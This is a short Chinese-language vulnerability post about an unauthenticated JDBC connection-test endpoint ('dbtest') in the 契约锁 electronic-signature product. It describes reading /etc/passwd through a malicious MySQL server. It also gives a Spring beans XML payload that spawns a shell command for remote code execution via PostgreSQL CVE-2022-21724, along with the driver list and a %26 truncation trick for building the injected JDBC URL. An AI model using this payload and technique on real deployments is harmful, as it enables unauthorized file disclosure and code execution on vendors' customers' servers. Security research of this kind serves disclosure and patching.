post.title: 契约锁 dbtest JDBC 任意文件文件读取 & 远程代码执行漏洞

title: 这里默认采用Mysql驱动，获取各种参数后，构建出jdbcurl发起连接。经测试该接口是未授权的。
通过查看Database的枚举类型可知，可以选择如下驱动：
启动一个恶意Mysql服务器，发送请求即可读取/etc/passwd文件
经过查看PostgreSQL的版本，发现是符合CVE-2022-21724的版本范围的
那么起一个HTTP服务，放置一个恶意的xml文件：

<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>sh</value>
                <value>-c</value>
                <value><![CDATA[touch /tmp/pwned]]></value>
            </list>
            </constructor-arg>
        </bean>
    </beans>

public enum Database {
    MYSQL("MySQL", "com.mysql.cj.jdbc.Driver", "jdbc:mysql://{}:{}/{}?serverTimezone=GMT%2B8&useUnicode=true&useSSL=false&characterEncoding=utf-8&allowPublicKeyRetrieval=true", "`{0}`"),
    ORACLE("Oracle", "oracle.jdbc.OracleDriver", "jdbc:oracle:thin:@//{}:{}/{}", "\"LEVEL\""),
    SQLSERVER("Microsoft SQL Server", "com.microsoft.sqlserver.jdbc.SQLServerDriver", "jdbc:sqlserver://{}:{};DatabaseName={}", "[{0}]"),
    DM("DM DBMS", "dm.jdbc.driver.DmDriver", "jdbc:dm://{}:{}", "{0}"),
    OSCAR("OSCAR", "com.oscar.Driver", "jdbc:oscar://{}:{}/{}", "{0}"),
    KINGBASEES("KingbaseES", "com.kingbase8.Driver", "jdbc:kingbase8://{}:{}/{}", "{0}"),
    POSTGRESQL("PostgreSQL", "org.postgresql.Driver", "jdbc:postgresql://{}:{}/{}", "{0}"),
    OCEANBASE_MYSQL("OCEANBASE_MYSQL", "com.alipay.oceanbase.jdbc.Driver", "jdbc:oceanbase://{}:{}/{}?useUnicode=true&useSSL=false&characterEncoding=utf-8", "{0}"),
    OCEANBASE_ORACLE("OCEANBASE_ORACLE", "com.alipay.oceanbase.jdbc.Driver", "jdbc:oceanbase://{}:{}/{}?useUnicode=true&useSSL=false&characterEncoding=utf-8", "{0}"),
    VASTBASE_G100("VASTBASE_G100", "cn.com.vastbase.Driver", "jdbc:vastbase://{}:{}/{}", "{0}");
db的值必须是全大写的，否则会400状态码
POSTGRESQL会拼接port和dbname，所以需要在host末尾添加%26来截断
